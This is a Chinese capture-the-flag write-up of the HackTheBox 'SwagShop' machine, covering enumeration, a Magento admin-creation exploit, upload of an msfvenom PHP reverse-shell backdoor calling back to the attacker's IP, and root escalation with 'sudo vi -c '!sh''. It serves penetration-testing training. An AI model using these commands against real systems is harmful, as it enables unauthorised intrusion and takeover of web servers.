原创：w0x68y合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

![v2-b6ac4acb391e97c8ef3bf1f3f5fe9a62_hd.w](https://pic2.zhimg.com/80/v2-b6ac4acb391e97c8ef3bf1f3f5fe9a62_hd.webp)

介绍

今天给大家带来的是一个HTB(hackthebox)的靶机—SwagShop，这是一个easy级别的linux系统的靶机，所以主要是对枚举,信息收集等手段的考察。对OSCP感兴趣的同学也可以去试着去HTB上找些靶机做做看。

![v2-bb46397a159dc9f2451ed868840104d8_hd.w](https://pic2.zhimg.com/80/v2-bb46397a159dc9f2451ed868840104d8_hd.webp)

![v2-a17f39b0263ccd7b5082f9456ca34bcd_hd.w](https://pic4.zhimg.com/80/v2-a17f39b0263ccd7b5082f9456ca34bcd_hd.webp)

信息收集

对目标进行一个初步的扫描。

nmap -T4 -sC -sV10.10.10.140

发现只对22端口以及80端口进行了开放。

![v2-428209a1bdc469a8dfca7030094db19f_hd.w](https://pic1.zhimg.com/80/v2-428209a1bdc469a8dfca7030094db19f_hd.webp)

顺便对其进行目录遍历,我们发现一个有意思的目录,这个有用,后面再说。

dirbhttp://10.10.10.140 /usr/share/dirb/wordlists/common.txt

![v2-008336a5488cbee387151a0bd8607931_hd.w](https://pic4.zhimg.com/80/v2-008336a5488cbee387151a0bd8607931_hd.webp)

我们打开网站,通过火狐的插件Wappalyzer,或者网页logo就可以发现是个开源的电子商务网站。

![v2-d25ed68d46ef91c9a300b8d85de82dc0_hd.w](https://pic2.zhimg.com/80/v2-d25ed68d46ef91c9a300b8d85de82dc0_hd.webp)

![v2-e14aa48639899853e99c94f27af0b483_hd.w](https://pic1.zhimg.com/80/v2-e14aa48639899853e99c94f27af0b483_hd.webp)

![v2-bf4dd73df11d94303ce4193bd4b64177_hd.w](https://pic4.zhimg.com/80/v2-bf4dd73df11d94303ce4193bd4b64177_hd.webp)

漏洞利用

通过searchsploit搜索发现漏洞还是挺多的。

![v2-55d5f51776d025e9113d0a712952023d_hd.w](https://pic1.zhimg.com/80/v2-55d5f51776d025e9113d0a712952023d_hd.webp)

我们发现一个RCE漏洞吸引了我们的注意力，所以我们选择37977的漏洞试试，把expcp到我们的目录，发现这个脚本可以创建一个admin权限的账户。但是我们需要改变一下里面的内容，target为我们的目标ip:http://10.10.10.140/index.php，并且删除一些不必要的注释。

参考地址:http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/

此时运行我们的exp

![v2-6ae41534f9744754b4228737033c78dd_hd.w](https://pic2.zhimg.com/80/v2-6ae41534f9744754b4228737033c78dd_hd.webp)

显示我们的exp运行了，但是这个后台地址是不对的，这就要用到刚刚我们扫到的地址了，

http://10.10.10.140/downloader/

这个地址也可以直接用exp添加的账户进行登陆

![v2-dc4305c54234b1643e9023f97829d729_hd.w](https://pic1.zhimg.com/80/v2-dc4305c54234b1643e9023f97829d729_hd.webp)

.

我们成功登陆了后台，之后我们可以用在google找到的后门项目进行备份还原来拿shell，

https://github.com/P34C3-07/LavaMagentoBD

我们可以用msf来生成一个php后门，

msfvenom -pphp/meterpreter/reverse_tcp LHOST=10.10.14.175 LPORT=4444 -f raw
>shell.php

之后在压缩包放置你的shell,这里我的路径是

/app/code/community/Lavalamp/Connector/IndexController.php

用Directpackage file upload功能进行上传

![v2-2ffde074ddf668189eca113b1590643f_hd.w](https://pic3.zhimg.com/80/v2-2ffde074ddf668189eca113b1590643f_hd.webp)

上传成功.

接下来msf进行监听,成功返回shell。

![v2-01d0e1b898fbd06e53ff6c6bc24d2ffa_hd.w](https://pic3.zhimg.com/80/v2-01d0e1b898fbd06e53ff6c6bc24d2ffa_hd.webp)

我们可以在/home/haris找到第一个user.txt

![v2-4d898e03f4d03af1e08af4a558a0b4b1_hd.w](https://pic3.zhimg.com/80/v2-4d898e03f4d03af1e08af4a558a0b4b1_hd.webp)

##  
  

![v2-8eca10306f15d37895c9e4a1e29a2feb_hd.w](https://pic4.zhimg.com/80/v2-8eca10306f15d37895c9e4a1e29a2feb_hd.webp)

提权

接下来我们要进行提权,sudo-l看一下,发现可以不用密码就以root权限执行vi。

![v2-caa9911b97a2b3ff2a1b00fb90d3db97_hd.w](https://pic3.zhimg.com/80/v2-caa9911b97a2b3ff2a1b00fb90d3db97_hd.webp)

我们可以去/var/www/html/目录下创建一个文件，利用vi的-c参数进行提权,我们利用这条指令即可提权，如图显示提权成功,获取到root.txt

sudo vi /var/www/html/111 -c '!sh'

![v2-1dee77070f23e1b9e4e60a809101583e_hd.w](https://pic3.zhimg.com/80/v2-1dee77070f23e1b9e4e60a809101583e_hd.webp)

![v2-bf6d294526f12eab48e6dc3b64acae96_hd.w](https://pic2.zhimg.com/80/v2-bf6d294526f12eab48e6dc3b64acae96_hd.webp)

相关实验

VulnHub渗透测试实战
：Vulnhub是一个面向公众开放的靶机平台，主旨是让任何人获得信息安全相关的实战经验。里面有很多设计好的练习靶机镜像，每个镜像有一个或多个flag。

长按下面二维码，或点击“[课程:VulnHub渗透测试实战(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=CCIDee68-cedc-49cf-9d77-55bb6e417128)”，可预览学习（PC端操作最佳哟）

![v2-1353724e353f53247ce5287a23c0d768_hd.w](https://pic1.zhimg.com/80/v2-1353724e353f53247ce5287a23c0d768_hd.webp)

![v2-cf17776e65730f12e479bdbea0d75cde_hd.p](https://pic2.zhimg.com/80/v2-cf17776e65730f12e479bdbea0d75cde_hd.png)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！

  

